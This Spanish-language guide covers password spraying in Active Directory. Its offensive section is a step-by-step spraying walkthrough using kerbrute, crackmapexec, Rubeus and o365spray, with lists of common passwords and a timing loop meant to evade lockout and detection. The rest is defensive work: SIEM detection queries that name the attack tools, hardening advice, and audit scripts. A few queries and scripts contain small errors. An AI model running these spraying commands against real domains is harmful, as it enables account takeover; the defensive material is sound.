# 🛑 Ataques de **Password Spraying en Active Directory**

---

## 📝 ¿Qué es Password Spraying y por qué es peligroso?

| Concepto      | Descripción                                                                                                       |
|---------------|------------------------------------------------------------------------------------------------------------------|
| **Definición**| Técnica de ataque de credenciales que intenta pocas contraseñas comunes contra muchas cuentas de usuario para evitar políticas de bloqueo de cuentas. Es más sigiloso que ataques de fuerza bruta tradicionales y explota contraseñas débiles comunes en organizaciones. |
| **Finalidad** | Obtener credenciales válidas iniciales para acceso al dominio sin generar bloqueos masivos de cuentas. Permite acceso inicial para ataques posteriores más sofisticados como Kerberoasting, AS-REP Roasting, o movimiento lateral. |

---

## 📈 Elementos críticos para Password Spraying

| Componente | Descripción | Fuente de información |
|------------|-------------|-----------------------|
| **Lista de usuarios** | Enumeración de cuentas válidas del dominio | LDAP, SMB, Kerberos pre-auth, OSINT |
| **Contraseñas comunes** | Lista de passwords frecuentes en organizaciones | Password123, Summer2024, Company123, etc. |
| **Política de bloqueo** | Umbral y duración de lockout de cuentas | LDAP queries, net accounts /domain |
| **Timing strategy** | Espaciado entre intentos para evitar detección | Basado en políticas de lockout |

> **⚠️ ALERTA CRÍTICA**: Password spraying es efectivo porque explota el patrón humano de usar contraseñas predecibles. Un solo éxito puede comprometer completamente el dominio.

### Contraseñas comúnmente utilizadas en Password Spraying:

```
Password123        -> Formato empresa + año/número
Company2024        -> Nombre empresa + año actual
Summer2024         -> Estación + año
Welcome123         -> Palabras de bienvenida comunes
Admin123           -> Roles + números simples
123456             -> Secuencias numéricas simples
P@ssw0rd           -> Variaciones de "password"
Qwerty123          -> Patrones de teclado + números
```

---

## 🛠️ ¿Cómo funciona y cómo se explota Password Spraying? (TTPs y ejemplos)

| Vector/Nombre              | Descripción breve                                                                                   |
|----------------------------|----------------------------------------------------------------------------------------------------|
| **SMB Password Spraying** | Usa autenticación SMB para probar credenciales contra shares administrativos. |
| **Kerberos Pre-auth Spraying** | Explota autenticación Kerberos para validar credenciales sin lockout. |
| **LDAP Password Spraying** | Utiliza bind LDAP para validar credenciales contra el directorio. |
| **WinRM Password Spraying** | Prueba credenciales contra Windows Remote Management endpoints. |
| **RDP Password Spraying** | Ataque contra servicios Remote Desktop Protocol expuestos. |
| **Web Application Spraying** | Targeting de aplicaciones web con autenticación AD integrada. |
| **OWA/O365 Password Spraying** | Ataques contra Outlook Web Access y Office 365 portals. |

---

## 💻 Ejemplo práctico ofensivo (paso a paso)

```bash
# 1. Enumerar usuarios válidos del dominio
kerbrute userenum --dc 10.10.10.100 -d domain.com userlist.txt

# 2. Verificar política de bloqueo de cuentas
net accounts /domain

# 3. Password spraying con CrackMapExec (SMB)
crackmapexec smb targets.txt -u users.txt -p 'Password123' --continue-on-success

# 4. Password spraying con NetExec (nueva versión)
nxc smb 10.10.10.100 -u users.txt -p 'Company2024' --continue-on-success

# 5. Kerberos password spraying con Rubeus
.\Rubeus.exe passwordspray /domain:domain.com /users:users.txt /passwords:passwords.txt /outfile:spraying_results.txt

# 6. LDAP password spraying con crackmapexec
crackmapexec ldap 10.10.10.100 -u users.txt -p 'Summer2024' --continue-on-success

# 7. WinRM password spraying
crackmapexec winrm 10.10.10.100 -u users.txt -p 'Welcome123' --continue-on-success

# 8. Password spraying con delay para evadir detección
for user in $(cat users.txt); do
    crackmapexec smb 10.10.10.100 -u $user -p 'Password123'
    sleep 60  # 1 minuto entre intentos
done

# 9. Spray con múltiples contraseñas espaciadas
python3 DomainPasswordSpray.py -u users.txt -p passwords.txt -d domain.com -DC 10.10.10.100 -sleep 120

# 10. Kerberos spraying sin lockout con kerbrute
kerbrute passwordspray --dc 10.10.10.100 -d domain.com users.txt 'Password123'

# 11. Password spraying contra OWA/O365
python3 o365spray.py --enum -U users.txt --domain company.com
python3 o365spray.py --spray -U valid_users.txt -P passwords.txt --count 1 --lockout 1 --domain company.com

# 12. Spraying con rotación de contraseñas estacionales
# Enero: Winter2024, Febrero: February2024, etc.
current_month=$(date +%B)
current_year=$(date +%Y)
password="${current_month}${current_year}"
crackmapexec smb targets.txt -u users.txt -p "$password"

# 13. Targeting de cuentas específicas (administradores)
grep -E "(admin|svc|service)" users.txt > high_value_users.txt
crackmapexec smb 10.10.10.100 -u high_value_users.txt -p 'Admin123' --continue-on-success

# 14. Spraying con lista personalizada por organización
echo "Password123" > org_passwords.txt
echo "CompanyName2024" >> org_passwords.txt
echo "Welcome2024" >> org_passwords.txt
crackmapexec smb 10.10.10.100 -u users.txt -p org_passwords.txt --continue-on-success
```

---

## 📋 Caso de Uso Completo Splunk

### 🎯 Contexto empresarial y justificación

**Problema de negocio:**
- Password spraying explota contraseñas débiles sin activar sistemas de bloqueo
- Un solo éxito en spraying puede resultar en compromiso inicial del dominio
- Ataques son difíciles de detectar debido a volumen bajo y distribución temporal
- Costo estimado de brecha inicial via password spraying: $1,500,000 USD promedio

**Valor de la detección:**
- Identificación temprana de ataques de credenciales distribuidos
- Detección de patrones anómalos de autenticación fallida
- Prevención de compromiso inicial en 85% de campañas de spraying
- Cumplimiento con controles de protección de identidad y acceso

### 📐 Arquitectura de implementación

**Prerequisitos técnicos:**
- Splunk Enterprise 8.2+ con capacidad para logs de autenticación
- Universal Forwarders en todos los Domain Controllers
- Logs de autenticación de servicios críticos (SMB, LDAP, WinRM, RDP)
- Baseline de patrones de autenticación legítimos
- Integración con threat intelligence feeds

**Arquitectura de datos:**
```
[Domain Controllers + Services] → [Universal Forwarders] → [Indexers] → [Search Heads]
       ↓                               ↓                       ↓
[EventCode 4625/4771]         [WinEventLog:Security]     [Index: wineventlog]
[Application Logs]                    ↓                       ↓
[Failed Auth Patterns]          [Real-time processing]   [Password Spray Alerting]
```

### 🔧 Guía de implementación paso a paso

#### Fase 1: Configuración inicial (Tiempo estimado: 75 min)

1. **Habilitar auditoría completa de autenticación:**
   ```powershell
   # En todos los Domain Controllers y servers críticos
   auditpol /set /subcategory:"Logon" /success:enable /failure:enable
   auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
   auditpol /set /subcategory:"Account Lockout" /success:enable /failure:enable
   
   # Verificar configuración
   auditpol /get /subcategory:"Logon"
   auditpol /get /subcategory:"Kerberos Authentication Service"
   ```

2. **Configurar threshold de detección basado en política:**
   ```powershell
   # Obtener política de bloqueo actual
   net accounts /domain
   
   # Configurar alertas basadas en umbral de lockout - 1
   # Si lockout = 5 intentos, alertar en 3-4 fallos por usuario
   ```

3. **Crear baseline de autenticación legítima:**
   ```splunk
   index=wineventlog EventCode=4625 earliest=-30d@d latest=@d
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Source Network Address:\s+(?<SourceIP>[^\s]+)"
   | rex field=Message "Logon Type:\s+(?<LogonType>[^\s]+)"
   | stats count by AccountName, SourceIP, LogonType
   | where count < 5
   | outputlookup failed_auth_baseline.csv
   ```

#### Fase 2: Implementación de detecciones críticas (Tiempo estimado: 100 min)

1. **Alerta CRÍTICA - Password spraying distribuido:**
   ```splunk
   index=wineventlog EventCode=4625
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Source Network Address:\s+(?<SourceIP>[^\s]+)"
   | bin _time span=1h
   | stats dc(AccountName) as unique_users, count as total_failures by SourceIP, _time
   | where unique_users >= 10 AND total_failures >= 15
   | eval severity="CRITICAL", technique="Password Spraying Detected"
   | eval risk_score=95
   | table _time, SourceIP, unique_users, total_failures, severity, risk_score
   ```

2. **Alerta ALTA - Patrón de contraseña común:**
   ```splunk
   index=wineventlog EventCode=4625
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Source Network Address:\s+(?<SourceIP>[^\s]+)"
   | bin _time span=30m
   | stats count by AccountName, SourceIP, _time
   | stats dc(AccountName) as targeted_users by SourceIP, _time
   | where targeted_users >= 5
   | eval severity="HIGH", technique="Potential Password Spray"
   | eval risk_score=80
   | table _time, SourceIP, targeted_users, severity, risk_score
   ```

3. **Alerta MEDIA - Kerberos pre-auth failures:**
   ```splunk
   index=wineventlog EventCode=4771
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Client Address:\s+(?<ClientAddress>[^\s]+)"
   | rex field=Message "Failure Code:\s+(?<FailureCode>[^\s]+)"
   | where FailureCode="0x18"
   | bin _time span=1h
   | stats dc(AccountName) as unique_accounts by ClientAddress, _time
   | where unique_accounts >= 8
   | eval severity="MEDIUM", technique="Kerberos Password Spray"
   | eval risk_score=70
   | table _time, ClientAddress, unique_accounts, severity, risk_score
   ```

4. **Alerta ALTA - Successful auth after spray pattern:**
   ```splunk
   index=wineventlog (EventCode=4625 OR EventCode=4624)
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Source Network Address:\s+(?<SourceIP>[^\s]+)"
   | eval event_type=case(EventCode=4625, "failed", EventCode=4624, "success", 1=1, "other")
   | transaction SourceIP maxspan=2h
   | eval failed_count=mvcount(split(searchmatch("event_type=failed"), " "))
   | where failed_count >= 10 AND searchmatch("event_type=success")
   | eval severity="HIGH", technique="Password Spray with Success"
   | eval risk_score=90
   | table _time, SourceIP, AccountName, failed_count, severity, risk_score
   ```

#### Fase 3: Dashboard crítico y validación (Tiempo estimado: 60 min)

1. **Dashboard de monitoreo crítico:**
   ```xml
   <dashboard>
     <label>Critical: Password Spraying Detection</label>
     <row>
       <panel>
         <title>🚨 CRITICAL: Password Spraying Sources</title>
         <table>
           <search refresh="300s">
             <query>
               index=wineventlog EventCode=4625 earliest=-1h
               | rex field=Message "Source Network Address:\s+(?&lt;SourceIP&gt;[^\s]+)"
               | rex field=Message "Account Name:\s+(?&lt;AccountName&gt;[^\s]+)"
               | bin _time span=10m
               | stats dc(AccountName) as unique_users, count as total_failures by SourceIP, _time
               | where unique_users &gt;= 5
               | table _time, SourceIP, unique_users, total_failures
             </query>
           </search>
         </table>
       </panel>
     </row>
   </dashboard>
   ```

### ✅ Criterios de éxito

**Métricas críticas:**
- MTTD para password spraying: < 15 minutos (CRÍTICO)
- MTTD para patrones de contraseña común: < 30 minutos
- Tasa de falsos positivos: < 3% (autenticación legítima distribuida)
- Cobertura de servicios: 100% (AD, SMB, LDAP, WinRM, RDP)

---

## 📊 Detección en logs y SIEM (Splunk)

| Campo clave                     | Descripción                                                                  |
|---------------------------------|------------------------------------------------------------------------------|
| **EventCode = 4625**            | Failed logon - base para detectar patrones de password spraying.            |
| **EventCode = 4771**            | Kerberos pre-auth failed - spraying sin lockout de cuenta.                  |
| **EventCode = 4740**            | Account lockout - indica spraying agresivo o detectado.                     |
| **Source Network Address**      | IP origen - identificar fuentes de spraying distribuido.                    |
| **Account Name**                | Usuario objetivo - detectar targeting de múltiples cuentas.                 |
| **Logon Type**                  | Tipo de autenticación - SMB (3), Interactive (2), Network (3).             |
| **Failure Reason**              | Razón del fallo - contraseña incorrecta vs. cuenta bloqueada.               |

### Query Splunk: Detección principal de Password Spraying

```splunk
index=wineventlog EventCode=4625
| rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
| rex field=Message "Source Network Address:\s+(?<SourceIP>[^\s]+)"
| where SourceIP!="127.0.0.1" AND SourceIP!="-"
| bin _time span=1h
| stats dc(AccountName) as unique_users, values(AccountName) as targeted_users, count as total_attempts by SourceIP, _time
| where unique_users >= 10
| eval alert_type="CRITICAL - Password Spraying Detected"
| table _time, SourceIP, unique_users, total_attempts, targeted_users, alert_type
```

### Query: Spraying con éxito posterior

```splunk
index=wineventlog (EventCode=4625 OR EventCode=4624)
| rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
| rex field=Message "Source Network Address:\s+(?<SourceIP>[^\s]+)"
| eval event_type=if(EventCode=4625, "failed", "success")
| bin _time span=2h
| stats count(eval(event_type="failed")) as failed_attempts, count(eval(event_type="success")) as successful_logins, dc(AccountName) as unique_accounts by SourceIP, _time
| where failed_attempts >= 15 AND successful_logins >= 1 AND unique_accounts >= 8
| eval alert_type="HIGH - Password Spray with Successful Compromise"
| table _time, SourceIP, failed_attempts, successful_logins, unique_accounts, alert_type
```

### Query: Kerberos password spraying

```splunk
index=wineventlog EventCode=4771
| rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
| rex field=Message "Client Address:\s+(?<ClientAddress>[^\s]+)"
| rex field=Message "Failure Code:\s+(?<FailureCode>[^\s]+)"
| where FailureCode="0x18"  # Pre-authentication failed
| bin _time span=30m
| stats dc(AccountName) as targeted_accounts, count as total_failures by ClientAddress, _time
| where targeted_accounts >= 5
| eval alert_type="MEDIUM - Kerberos Password Spray"
| table _time, ClientAddress, targeted_accounts, total_failures, alert_type
```

### Query: Detección de contraseñas estacionales

```splunk
index=wineventlog EventCode=4625
| rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
| rex field=Message "Source Network Address:\s+(?<SourceIP>[^\s]+)"
| eval current_season=case(
    (month(now())>=3 AND month(now())<=5), "Spring",
    (month(now())>=6 AND month(now())<=8), "Summer", 
    (month(now())>=9 AND month(now())<=11), "Fall",
    1=1, "Winter"
)
| bin _time span=1h
| stats dc(AccountName) as unique_accounts by SourceIP, _time
| where unique_accounts >= 8
| eval alert_type="MEDIUM - Seasonal Password Pattern"
| table _time, SourceIP, unique_accounts, current_season, alert_type
```

---

## 🛡️ Detección con Windows Defender for Endpoint

### Reglas de detección personalizadas

```kql
// Password spraying - múltiples fallos desde misma IP
SecurityEvent
| where EventID == 4625 // Failed logon
| extend SourceIP = extract(@"Source Network Address:\s+([^\s]+)", 1, EventData)
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| where SourceIP != "127.0.0.1" and SourceIP != "-"
| summarize UniqueAccounts = dcount(AccountName), TotalAttempts = count() by SourceIP, bin(TimeGenerated, 1h)
| where UniqueAccounts >= 10
| extend AlertType = "CRITICAL - Password Spraying"
```

```kql
// Kerberos password spraying
SecurityEvent
| where EventID == 4771 // Kerberos pre-auth failed
| extend ClientAddress = extract(@"Client Address:\s+([^\s]+)", 1, EventData)
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| extend FailureCode = extract(@"Failure Code:\s+([^\s]+)", 1, EventData)
| where FailureCode == "0x18"
| summarize TargetedAccounts = dcount(AccountName) by ClientAddress, bin(TimeGenerated, 30m)
| where TargetedAccounts >= 5
| extend AlertType = "MEDIUM - Kerberos Password Spray"
```

```kql
// Password spray seguido de logon exitoso
SecurityEvent
| where EventID in (4625, 4624) // Failed and successful logons
| extend SourceIP = extract(@"Source Network Address:\s+([^\s]+)", 1, EventData)
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| extend EventType = case(EventID == 4625, "Failed", "Success")
| summarize FailedAttempts = countif(EventType == "Failed"), SuccessfulLogins = countif(EventType == "Success"), UniqueAccounts = dcount(AccountName) by SourceIP, bin(TimeGenerated, 2h)
| where FailedAttempts >= 15 and SuccessfulLogins >= 1 and UniqueAccounts >= 8
| extend AlertType = "HIGH - Password Spray with Compromise"
```

### Alertas recomendadas

| Regla | Descripción | Severidad |
|-------|-------------|-----------|
| **Multi-User Failed Auth** | Múltiples fallos de autenticación desde misma IP | Crítica |
| **Kerberos Pre-auth Spray** | Kerberos password spraying sin lockout | Media |
| **Spray with Success** | Password spraying seguido de logon exitoso | Alta |
| **Account Lockout Spike** | Incremento anómalo de bloqueos de cuenta | Alta |

---

## 🦅 Detección con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Password spraying detection
event_platform=Win event_simpleName=UserLogonFailed
| stats dc(UserName) as unique_users, count as total_failures by LocalAddressIP4, _time
| where unique_users >= 10
| table _time, LocalAddressIP4, unique_users, total_failures
| sort - total_failures
```

```sql
-- Kerberos password spraying
event_platform=Win event_simpleName=KerberosLogonFailed
| search FailureReason="Pre-authentication failed"
| stats dc(UserName) as targeted_accounts by RemoteAddressIP4, _time
| where targeted_accounts >= 5
| table _time, RemoteAddressIP4, targeted_accounts
```

```sql
-- Password spraying tools detection
event_platform=Win event_simpleName=ProcessRollup2
| search (CommandLine=*crackmapexec* OR CommandLine=*"password spray"* OR CommandLine=*kerbrute* OR FileName=DomainPasswordSpray.ps1)
| table _time, ComputerName, UserName, CommandLine, ParentBaseFileName
```

---

## 🔍 Queries KQL para Microsoft Sentinel

### Detección principal de Password Spraying

```kql
// Query principal para detectar password spraying
SecurityEvent
| where EventID == 4625 // Failed logon
| extend SourceIP = extract(@"Source Network Address:\s+([^\s]+)", 1, EventData)
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| where SourceIP != "127.0.0.1" and SourceIP != "-"
| summarize UniqueAccounts = dcount(AccountName), TotalFailures = count(), TargetedUsers = make_set(AccountName) by SourceIP, bin(TimeGenerated, 1h)
| where UniqueAccounts >= 10
| extend AlertLevel = "CRITICAL", AttackType = "Password Spraying"
| project TimeGenerated, SourceIP, UniqueAccounts, TotalFailures, TargetedUsers, AlertLevel, AttackType
```

### Hunting avanzado

```kql
// Correlación: Password spray + herramientas ofensivas
SecurityEvent
| where EventID == 4625
| extend SourceIP = extract(@"Source Network Address:\s+([^\s]+)", 1, EventData)
| summarize FailedAccounts = dcount(AccountName) by SourceIP, bin(TimeGenerated, 1h)
| where FailedAccounts >= 8
| join kind=inner (
    DeviceProcessEvents
    | where ProcessCommandLine has_any ("crackmapexec", "kerbrute", "passwordspray")
    | extend ProcessTime = TimeGenerated
) on $left.SourceIP == $right.LocalIP
| where ProcessTime - TimeGenerated between (-1h .. 1h)
| project TimeGenerated, SourceIP, FailedAccounts, ProcessCommandLine
```

```kql
// Password spraying desde ubicaciones geográficas anómalas
SecurityEvent
| where EventID == 4625
| extend SourceIP = extract(@"Source Network Address:\s+([^\s]+)", 1, EventData)
| summarize UniqueAccounts = dcount(AccountName) by SourceIP, bin(TimeGenerated, 1h)
| where UniqueAccounts >= 8
| evaluate ipv4_lookup(GeoLite2_City, SourceIP, Country, City)
| where Country !in ("Expected_Countries")
| extend AlertType = "CRITICAL - Password Spray from Anomalous Location"
```

---

## 🦾 Hardening y mitigación

| Medida                                         | Descripción                                                                                       |
|------------------------------------------------|--------------------------------------------------------------------------------------------------|
| **Políticas de contraseña robustas**          | Contraseñas complejas, longitud mínima 12 caracteres, sin patrones comunes.                     |
| **Account lockout threshold bajo**             | Configurar bloqueo tras 3-5 intentos fallidos.                                                  |
| **Multi-Factor Authentication (MFA)**          | Obligatorio para todas las cuentas, especialmente privilegiadas.                                |
| **Conditional Access Policies**               | Políticas basadas en ubicación, dispositivo, riesgo de usuario.                                 |
| **Password blacklisting**                     | Prohibir contraseñas comunes y relacionadas con la organización.                                |
| **Rate limiting**                              | Limitar velocidad de intentos de autenticación por IP.                                          |
| **Network segmentation**                       | Restringir acceso a servicios de autenticación desde redes no confiables.                       |
| **Honeypot accounts**                          | Cuentas señuelo que alertan ante cualquier intento de acceso.                                   |
| **Regular password audits**                    | Auditorías periódicas de contraseñas débiles con herramientas como DSInternals.                 |
| **Security awareness training**                | Educación sobre creación de contraseñas seguras y únicas.                                       |

### Script de auditoría de contraseñas débiles

```powershell
# Auditoría de contraseñas débiles en AD (requiere DSInternals)
Import-Module DSInternals

# Lista de contraseñas comunes a verificar
$CommonPasswords = @(
    "Password123", "Company2024", "Summer2024", "Welcome123",
    "Admin123", "123456", "P@ssw0rd", "Qwerty123"
)

# Extraer hashes de AD (requiere privilegios)
$AllUsers = Get-ADDBAccount -All -DatabasePath "C:\Windows\NTDS\ntds.dit" -BootKey (Get-BootKey -SystemHivePath "C:\Windows\System32\config\SYSTEM")

# Verificar contraseñas débiles
$WeakPasswords = @()
foreach ($Password in $CommonPasswords) {
    $Hash = ConvertTo-NTHash -Password $Password
    $MatchingUsers = $AllUsers | Where-Object { $_.NTHash -eq $Hash }
    if ($MatchingUsers) {
        $WeakPasswords += [PSCustomObject]@{
            Password = $Password
            Hash = $Hash
            Users = $MatchingUsers.SamAccountName -join ", "
            Count = $MatchingUsers.Count
        }
    }
}

if ($WeakPasswords) {
    Write-Host "⚠️ CRÍTICO: Se encontraron contraseñas débiles:" -ForegroundColor Red
    $WeakPasswords | Format-Table -AutoSize
} else {
    Write-Host "✓ No se encontraron contraseñas débiles comunes" -ForegroundColor Green
}
```

---

## 🚨 Respuesta ante incidentes

1. **Bloquear inmediatamente IPs fuente** del password spraying identificado.
2. **Identificar cuentas comprometidas** si hay logons exitosos tras spraying.
3. **Forzar cambio de contraseñas** de cuentas objetivo del spraying.
4. **Revisar logs de autenticación** para identificar scope completo del ataque.
5. **Implementar MFA** en cuentas afectadas si no estaba habilitado.
6. **Analizar TTPs del atacante** para identificar herramientas utilizadas.
7. **Endurecer políticas** de contraseña y lockout basado en el ataque.
8. **Educación dirigida** a usuarios con contraseñas comprometidas.
9. **Monitoreo reforzado** de cuentas afectadas por spraying.

---

## 🧑‍💻 ¿Cómo revisar y detectar Password Spraying? (PowerShell)

### Detectar patrones de password spraying

```powershell
# Detectar password spraying en logs de seguridad
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625; StartTime=(Get-Date).AddHours(-24)} |
Group-Object {
    ($_.Properties[19].Value).ToString()  # Source IP
} |
Where-Object { $_.Count -ge 10 } |
ForEach-Object {
    $SourceIP = $_.Name
    $UniqueUsers = $_.Group | ForEach-Object { $_.Properties[5].Value } | Sort-Object -Unique
    
    [PSCustomObject]@{
        SourceIP = $SourceIP
        TotalAttempts = $_.Count
        UniqueUsers = $UniqueUsers.Count
        TargetedUsers = ($UniqueUsers | Select-Object -First 10) -join ", "
        Alert = "CRITICAL - Password Spraying Pattern"
    }
} | Format-Table -AutoSize
```

### Analizar política de bloqueo actual

```powershell
# Verificar configuración de política de bloqueo
$AccountPolicy = net accounts /domain 2>$null
if ($AccountPolicy) {
    Write-Host "=== POLÍTICA DE BLOQUEO ACTUAL ===" -ForegroundColor Yellow
    $AccountPolicy | Where-Object { $_ -match "(Lockout|threshold|duration)" }
    
    # Extraer threshold específico
    $LockoutThreshold = ($AccountPolicy | Where-Object { $_ -match "Lockout threshold" }) -replace ".*:\s*", ""
    if ($LockoutThreshold -eq "Never") {
        Write-Host "⚠️ CRÍTICO: Sin política de bloqueo configurada" -ForegroundColor Red
    } elseif ([int]$LockoutThreshold -gt 5) {
        Write-Host "⚠️ ADVERTENCIA: Threshold de bloqueo alto: $LockoutThreshold" -ForegroundColor Yellow
    } else {
        Write-Host "✓ Threshold de bloqueo apropiado: $LockoutThreshold" -ForegroundColor Green
    }
} else {
    Write-Host "⚠️ No se pudo obtener política de dominio" -ForegroundColor Yellow
}
```

### Identificar cuentas con contraseñas comunes

```powershell
# Buscar eventos de autenticación exitosa tras múltiples fallos (patrón de spraying exitoso)
$SuccessfulAfterFailures = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=@(4624,4625); StartTime=(Get-Date).AddHours(-2)} |
Sort-Object TimeCreated |
Group-Object {
    $_.Properties[5].Value + "_" + $_.Properties[19].Value  # User + Source IP
} |
Where-Object {
    $failures = ($_.Group | Where-Object { $_.Id -eq 4625 }).Count
    $successes = ($_.Group | Where-Object { $_.Id -eq 4624 }).Count
    $failures -ge 3 -and $successes -ge 1
} |
ForEach-Object {
    $UserIP = $_.Name -split "_"
    $FirstFailure = ($_.Group | Where-Object { $_.Id -eq 4625 } | Sort-Object TimeCreated | Select-Object -First 1).TimeCreated
    $FirstSuccess = ($_.Group | Where-Object { $_.Id -eq 4624 } | Sort-Object TimeCreated | Select-Object -First 1).TimeCreated
    
    [PSCustomObject]@{
        User = $UserIP[0]
        SourceIP = $UserIP[1]
        FailedAttempts = ($_.Group | Where-Object { $_.Id -eq 4625 }).Count
        TimeToSuccess = ($FirstSuccess - $FirstFailure).TotalMinutes
        Alert = "HIGH - Potential Password Compromise"
    }
}

if ($SuccessfulAfterFailures) {
    Write-Host "⚠️ CRÍTICO: Posibles contraseñas comprometidas vía spraying:" -ForegroundColor Red
    $SuccessfulAfterFailures | Format-Table -AutoSize
} else {
    Write-Host "✓ No se detectaron compromisos exitosos tras spraying" -ForegroundColor Green
}
```

### Script de auditoría completa para Password Spraying

```powershell
# Auditoría completa de seguridad contra Password Spraying
Write-Host "=== AUDITORÍA PASSWORD SPRAYING SECURITY ===" -ForegroundColor Red

# 1. Verificar política de bloqueo
Write-Host "1. Verificando política de bloqueo..." -ForegroundColor Yellow
$AccountPolicy = net accounts /domain 2>$null
if ($AccountPolicy) {
    $LockoutThreshold = ($AccountPolicy | Where-Object { $_ -match "Lockout threshold" }) -replace ".*:\s*", ""
    $LockoutDuration = ($AccountPolicy | Where-Object { $_ -match "Lockout duration" }) -replace ".*:\s*", ""
    
    Write-Host "Lockout threshold: $LockoutThreshold" -ForegroundColor White
    Write-Host "Lockout duration: $LockoutDuration" -ForegroundColor White
    
    if ($LockoutThreshold -eq "Never") {
        Write-Host "⚠️ CRÍTICO: Sin política de bloqueo - vulnerable a spraying" -ForegroundColor Red
    }
} else {
    Write-Host "⚠️ No se pudo verificar política de dominio" -ForegroundColor Yellow
}

# 2. Detectar patrones de spraying recientes
Write-Host "2. Buscando patrones de password spraying..." -ForegroundColor Yellow
$SprayingPatterns = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625; StartTime=(Get-Date).AddHours(-24)} -ErrorAction SilentlyContinue |
Group-Object { $_.Properties[19].Value } |
Where-Object { $_.Count -ge 8 } |
ForEach-Object {
    $UniqueUsers = $_.Group | ForEach-Object { $_.Properties[5].Value } | Sort-Object -Unique
    [PSCustomObject]@{
        SourceIP = $_.Name
        TotalFailures = $_.Count
        UniqueUsers = $UniqueUsers.Count
        FirstAttempt = ($_.Group | Sort-Object TimeCreated | Select-Object -First 1).TimeCreated
        LastAttempt = ($_.Group | Sort-Object TimeCreated | Select-Object -Last 1).TimeCreated
    }
}

if ($SprayingPatterns) {
    Write-Host "⚠️ CRÍTICO: Se detectaron patrones de password spraying:" -ForegroundColor Red
    $SprayingPatterns | Format-Table -AutoSize
} else {
    Write-Host "✓ No se detectaron patrones de password spraying" -ForegroundColor Green
}

# 3. Verificar bloqueos de cuenta recientes
Write-Host "3. Verificando bloqueos de cuenta..." -ForegroundColor Yellow
$RecentLockouts = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4740; StartTime=(Get-Date).AddHours(-24)} -ErrorAction SilentlyContinue |
ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        LockedAccount = $_.Properties[0].Value
        SourceHost = $_.Properties[1].Value
        CallerComputer = $_.Properties[4].Value
    }
}

if ($RecentLockouts) {
    Write-Host "⚠️ ADVERTENCIA: Se encontraron bloqueos recientes:" -ForegroundColor Yellow
    $RecentLockouts | Format-Table -AutoSize
} else {
    Write-Host "✓ No se encontraron bloqueos de cuenta recientes" -ForegroundColor Green
}

# 4. Buscar herramientas de password spraying
Write-Host "4. Buscando herramientas de spraying..." -ForegroundColor Yellow
$SprayingTools = Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1; StartTime=(Get-Date).AddHours(-24)} -ErrorAction SilentlyContinue |
Where-Object { $_.Message -match "crackmapexec|kerbrute|DomainPasswordSpray|passwordspray" } |
Select-Object -First 5

if ($SprayingTools) {
    Write-Host "⚠️ ADVERTENCIA: Se detectaron herramientas de spraying:" -ForegroundColor Yellow
    $SprayingTools | ForEach-Object {
        Write-Host "  - $($_.TimeCreated): $($_.Message -split "`n" | Select-String "CommandLine")" -ForegroundColor White
    }
} else {
    Write-Host "✓ No se detectaron herramientas de spraying" -ForegroundColor Green
}

# 5. Recomendaciones
Write-Host "=== RECOMENDACIONES ===" -ForegroundColor Cyan
if ($SprayingPatterns) {
    Write-Host "- Bloquear inmediatamente IPs fuente del spraying" -ForegroundColor Red
    Write-Host "- Forzar cambio de contraseñas de cuentas objetivo" -ForegroundColor Red
}
if ($LockoutThreshold -eq "Never") {
    Write-Host "- Configurar política de bloqueo de cuentas inmediatamente" -ForegroundColor Red
}
Write-Host "- Implementar MFA en todas las cuentas" -ForegroundColor Yellow
Write-Host "- Configurar alertas SIEM para detección automática" -ForegroundColor Yellow
Write-Host "- Auditar contraseñas débiles regularmente" -ForegroundColor Yellow
Write-Host "- Implementar rate limiting en servicios de autenticación" -ForegroundColor Yellow
}
```

---

## 📚 Referencias

- [Password Spraying - MITRE ATT&CK T1110.003](https://attack.mitre.org/techniques/T1110/003/)
- [CrackMapExec Documentation](https://github.com/byt3bl33d3r/CrackMapExec)
- [Kerbrute - Kerberos Password Spraying](https://github.com/ropnop/kerbrute)
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
- [Microsoft - Account Lockout Best Practices](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/account-lockout-threshold)
- [NIST - Authentication and Lifecycle Management](https://csrc.nist.gov/publications/detail/sp/800-63b/final)
- [SANS - Password Spraying Detection](https://www.sans.org/white-papers/password-spraying/)
- [Azure AD - Password Protection](https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-password-ban-bad)

---